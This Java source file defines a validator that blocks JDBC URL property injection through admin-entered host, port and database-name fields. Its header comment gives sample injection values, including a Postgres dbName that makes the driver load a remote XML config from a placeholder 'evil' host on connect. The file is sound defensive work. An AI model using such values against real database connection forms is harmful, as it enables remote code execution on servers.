package com.acquira.common.util;

import java.util.regex.Pattern;

/**
 * Validates the user-supplied pieces of an external-database JDBC URL.
 *
 * WHY THIS EXISTS (security, not tidiness)
 * ----------------------------------------
 * IntegrationConnection/DataSourceConfig build their JDBC URL by concatenating
 * admin-entered host / port / dbName. Every major driver parses extra
 * properties out of that string, so an unvalidated value is not "a bad
 * hostname" — it is arbitrary driver configuration, and on several drivers
 * that is remote code execution against THIS JVM:
 *
 *   POSTGRES  dbName = "d?socketFactory=org.springframework.context.support
 *             .ClassPathXmlApplicationContext&socketFactoryArg=http://evil/x.xml"
 *             -> the driver instantiates that class on connect (CVE-2022-21724
 *                class of bug). Merely pressing "Test connection" triggers it.
 *   MSSQL     dbName = "x;integratedSecurity=true;..." — the URL is a
 *             ';'-delimited property list, so anything after a ';' is a
 *             driver property.
 *   ORACLE    dbName = "svc?oracle.net.wallet_location=..." — outbound
 *             file/LDAP fetch under attacker control.
 *
 * So these values must be restricted to the character set that a legitimate
 * host and database/service name actually needs, and the separators that let
 * a caller start a new property ( ? & ; = space , / \ ' " ) must be rejected
 * outright rather than escaped.
 *
 * Applied at URL-construction time (not only in the controller) so every
 * caller — REST, scheduler, backfill, DBA-seeded rows — is covered.
 */
public final class JdbcTargetValidator {

    private JdbcTargetValidator() {}

    /** Hostname, IPv4, or bracketed IPv6. No scheme, no port, no properties. */
    private static final Pattern HOST =
            Pattern.compile("^(?:\\[[0-9A-Fa-f:]{2,45}]|[A-Za-z0-9](?:[A-Za-z0-9._-]{0,253}[A-Za-z0-9])?)$");

    /**
     * Database / Oracle service name. Dots are allowed (Oracle service names
     * are frequently qualified, e.g. ORCL.example.com); everything that could
     * open a new URL property is not.
     */
    private static final Pattern DB_NAME =
            Pattern.compile("^[A-Za-z0-9][A-Za-z0-9._$-]{0,127}$");

    public static String requireValidHost(String host) {
        if (host == null || host.isBlank()) {
            throw new IllegalArgumentException("Host is required");
        }
        String h = host.trim();
        if (!HOST.matcher(h).matches()) {
            throw new IllegalArgumentException(
                "Invalid host '" + h + "'. Use a hostname or IP address only — "
                + "characters such as ? & ; = / \\ space and quotes are not allowed, "
                + "because they would inject driver properties into the connection URL.");
        }
        return h;
    }

    public static String requireValidDbName(String dbName) {
        if (dbName == null || dbName.isBlank()) {
            throw new IllegalArgumentException("Database name is required");
        }
        String d = dbName.trim();
        if (!DB_NAME.matcher(d).matches()) {
            throw new IllegalArgumentException(
                "Invalid database/service name '" + d + "'. Letters, digits and . _ - $ only — "
                + "characters such as ? & ; = / \\ space and quotes are not allowed, "
                + "because they would inject driver properties into the connection URL.");
        }
        return d;
    }

    public static int requireValidPort(Integer port) {
        if (port == null || port < 1 || port > 65535) {
            throw new IllegalArgumentException("Port must be between 1 and 65535");
        }
        return port;
    }

    /**
     * String overload — DataSourceConfig stores port as a String (its entity
     * and the INTEGER column in schema.sql disagree). Parsing here means a
     * non-numeric value can never be concatenated into the URL, which would
     * otherwise be another property-injection slot.
     */
    public static int requireValidPort(String port) {
        if (port == null || port.isBlank()) {
            throw new IllegalArgumentException("Port is required");
        }
        try {
            return requireValidPort(Integer.valueOf(port.trim()));
        } catch (NumberFormatException e) {
            throw new IllegalArgumentException("Port must be a number between 1 and 65535, got '" + port + "'");
        }
    }
}
